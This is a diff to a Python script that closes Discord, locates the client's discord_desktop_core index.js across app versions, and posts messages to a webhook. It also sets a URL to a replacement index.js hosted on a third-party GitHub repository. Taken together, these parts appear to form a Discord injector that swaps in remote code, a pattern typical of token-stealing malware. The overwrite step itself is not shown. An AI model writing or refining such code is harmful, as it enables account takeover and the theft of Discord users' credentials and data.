@@ -15,11 +15,18 @@ def close_discord():
 
 def get_discord_path():
     appdata_path = os.getenv('LOCALAPPDATA')
-    discord_path = os.path.join(appdata_path, 'Discord', 'app-1.0.9182', 'modules', 'discord_desktop_core-1', 'discord_desktop_core', 'index.js')
+    discord_base_path = os.path.join(appdata_path, 'Discord')
     
-    discord_file = Path(discord_path)
-    if discord_file.exists():
-        return discord_file.parent
+    for folder in os.listdir(discord_base_path):
+        if folder.startswith('app-1'):
+            core_path = os.path.join(discord_base_path, folder, 'modules')
+            for subfolder in os.listdir(core_path):
+                if subfolder.startswith('discord_desktop_core'):
+                    discord_path = os.path.join(core_path, subfolder, 'discord_desktop_core', 'index.js')
+                    
+                    discord_file = Path(discord_path)
+                    if discord_file.exists():
+                        return discord_file.parent
     return None
 
 def send_webhook_message(webhook_url, message):
@@ -28,7 +35,7 @@ def send_webhook_message(webhook_url, message):
         response = requests.post(webhook_url, json=payload)
         response.raise_for_status()
     except requests.RequestException:
-        pass  
+        pass
 
 url = "https://raw.githubusercontent.com/theolomo/config/refs/heads/main/index.js"
 
